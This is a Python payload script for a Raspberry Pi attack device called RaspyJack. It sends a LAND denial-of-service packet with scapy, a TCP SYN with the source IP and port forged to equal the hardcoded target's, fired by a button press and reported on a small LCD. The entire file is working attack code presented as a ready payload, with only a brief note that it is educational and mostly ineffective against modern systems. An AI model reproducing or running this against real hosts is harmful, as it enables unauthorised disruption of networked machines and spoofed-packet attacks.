#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS Attack: LAND Attack**
==================================================
A classic Denial of Service (DoS) attack where a packet is sent to a
target with the source IP and port forged to be the same as the
destination IP and port.

This can cause older, unpatched operating systems to crash or become
unresponsive as they enter a loop replying to themselves.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. It is unlikely to work on modern
systems but is included for educational purposes.
"""

import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.50"
TARGET_PORT = 139 # A common open port

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# --- Main ---
def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    y = 40
    for line in lines:
        d.text((5, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    show_message(["Sending LAND", "attack packet..."], "yellow")
    
    try:
        # A TCP SYN packet where source IP/port == dest IP/port
        p = IP(src=TARGET_IP, dst=TARGET_IP) / TCP(sport=TARGET_PORT, dport=TARGET_PORT, flags="S")
        send(p, verbose=0)
        show_message(["Packet sent!", "Check target", "for effect."], "lime")
        
    except Exception as e:
        show_message(["Attack FAILED!", str(e)[:20]], "red")
        print(f"LAND attack failed: {e}", file=sys.stderr)

if __name__ == '__main__':
    try:
        show_message(["LAND Attack", f"Target: {TARGET_IP}", "Press OK to send."])
        while True:
            if GPIO.input(PINS["KEY3"]) == 0:
                break
            if GPIO.input(PINS["OK"]) == 0:
                run_attack()
                time.sleep(4)
                show_message(["Ready to attack", "again."])
            time.sleep(0.1)
            
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("LAND Attack payload finished.")
